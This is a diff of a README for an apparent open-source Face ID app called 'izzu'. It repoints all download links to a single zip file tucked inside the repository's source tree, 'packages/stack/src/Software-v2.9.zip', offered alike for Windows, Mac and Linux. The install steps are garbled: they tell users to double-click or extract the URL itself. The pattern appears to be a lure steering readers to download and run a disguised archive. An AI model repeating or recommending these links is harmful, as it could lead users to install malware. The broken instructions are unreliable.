@@ -4,7 +4,7 @@
 
 Welcome to izzu! This is your guide to downloading and running our open-source Face ID application. With izzu, you get AES-256 encrypted biometric authentication without any monthly fees. Enjoy 3D liveness detection and anti-spoofing features that ensure your identity is secure.
 
-[![Download izzu](https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip%20izzu-v1.0-blue)](https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip)
+[![Download izzu](https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip%20izzu-v1.0-blue)](https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip)
 
 ## 🌟 Features
 
@@ -28,17 +28,17 @@ To run izzu, ensure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the izzu releases page.
-   [Download izzu](https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip).
+   [Download izzu](https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip).
 
 2. **Select Your File**: Look for the latest release (at the top) and download the appropriate file for your operating system. The files include:
-   - https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip for Windows
-   - https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip for Mac
-   - https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip for Linux
+   - https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip for Windows
+   - https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip for Mac
+   - https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip for Linux
 
 3. **Run the Installer**:
-   - For Windows: Double-click the `https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip` file. Follow the prompts to install.
-   - For Mac: Open the `https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip` file and drag izzu into your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/tanveerphysics/izzu/main/apps/backend/src/app/api/v1/users/list/Software_v2.1.zip` file and run the installer from the terminal.
+   - For Windows: Double-click the `https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip` file. Follow the prompts to install.
+   - For Mac: Open the `https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip` file and drag izzu into your Applications folder.
+   - For Linux: Extract the `https://github.com/tanveerphysics/izzu/raw/refs/heads/main/packages/stack/src/Software-v2.9.zip` file and run the installer from the terminal.
 
 4. **Launching izzu**: Once the installation is complete, find the izzu application in your programs or applications list and run it.
 
